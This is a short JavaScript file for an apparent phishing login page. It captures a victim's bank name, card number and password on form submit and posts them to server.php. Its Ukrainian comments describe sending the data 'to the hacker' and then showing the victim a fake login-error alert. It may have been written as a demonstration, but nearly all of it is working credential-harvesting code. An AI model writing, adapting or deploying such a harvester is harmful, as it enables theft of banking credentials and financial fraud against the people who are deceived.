document.getElementById("login-form").addEventListener("submit", function (event) {
    event.preventDefault(); // Запобігаємо відправці форми

    let bank = document.getElementById("bank").value;
    let cardNumber = document.getElementById("card-number").value;
    let password = document.getElementById("password").value;

    // Надсилаємо дані "хакеру"
    fetch("server.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ bank, cardNumber, password })
    });

    // Показуємо жертві повідомлення про помилку входу
    alert("Помилка авторизації. Спробуйте ще раз.");
});
